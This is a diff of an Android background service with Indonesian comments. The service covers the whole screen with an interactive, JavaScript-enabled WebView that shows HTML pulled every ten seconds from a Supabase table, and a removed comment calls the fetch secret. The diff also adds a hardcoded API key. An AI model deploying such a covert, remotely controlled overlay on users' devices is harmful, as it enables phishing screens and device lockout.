@@ -28,12 +28,9 @@ public class LayananBackground extends Service {
     private Handler handler = new Handler(Looper.getMainLooper());
     private String htmlTerakhir = "";
     
-    // --- PENGATURAN SUPABASE ---
-    // URL ini langsung menembak ke tabel app_settings baris id 1
+    // Konfigurasi Supabase yang Anda berikan
     private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.1&select=html_content";
-    
-    // PERHATIAN: Masukkan Kunci API Supabase Anda yang berawalan 'eyJ...' di bawah ini
-    private final String KUNCI_SUPABASE = "MASUKKAN_KUNCI_API_EYJ_ANDA_DI_SINI"; 
+    private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
 
     @Override
     public void onCreate() {
@@ -45,14 +42,13 @@ public class LayananBackground extends Service {
     private void siapkanOverlayWeb() {
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         
-        // Membuat Browser/Web (WebView) sebagai pengganti layar hitam
         webViewOverlay = new WebView(this);
         WebSettings webSettings = webViewOverlay.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
         webViewOverlay.setWebViewClient(new WebViewClient());
         
-        // Set latar belakang transparan saat menunggu loading
+        // Latar belakang transparan
         webViewOverlay.setBackgroundColor(0x00000000); 
 
         int jenisOverlay;
@@ -62,7 +58,6 @@ public class LayananBackground extends Service {
             jenisOverlay = WindowManager.LayoutParams.TYPE_PHONE;
         }
 
-        // Pengaturan agar web menutupi seluruh layar dan bisa diklik (interaktif)
         WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -75,20 +70,18 @@ public class LayananBackground extends Service {
         windowManager.addView(webViewOverlay, parameter);
     }
 
-    // Fungsi Timer: Berjalan berulang kali tanpa mematikan HP
     private void mulaiPengecekanOtomatis() {
         Runnable sistemPemantau = new Runnable() {
             @Override
             public void run() {
                 tarikDataDariAdmin();
-                // Mengulang perintah ini setiap 10.000 milidetik (10 detik)
+                // Mengulang pengecekan setiap 10 detik (10000 ms)
                 handler.postDelayed(this, 10000); 
             }
         };
         handler.post(sistemPemantau);
     }
 
-    // Fungsi untuk menyedot file HTML dari Supabase secara diam-diam
     private void tarikDataDariAdmin() {
         new Thread(new Runnable() {
             @Override
@@ -110,19 +103,17 @@ public class LayananBackground extends Service {
                         }
                         in.close();
 
-                        // Membaca data JSON dari Supabase
                         JSONArray dataJson = new JSONArray(response.toString());
                         if (dataJson.length() > 0) {
                             JSONObject barisData = dataJson.getJSONObject(0);
                             final String htmlBaru = barisData.getString("html_content");
 
-                            // Jika HTML yang didapat berbeda dari yang sedang tampil, otomatis perbarui layar!
+                            // Perbarui layar jika ada file HTML baru yang diunggah
                             if (!htmlBaru.equals(htmlTerakhir)) {
                                 htmlTerakhir = htmlBaru;
                                 handler.post(new Runnable() {
                                     @Override
                                     public void run() {
-                                        // Merender HTML ke layar
                                         webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
                                     }
                                 });
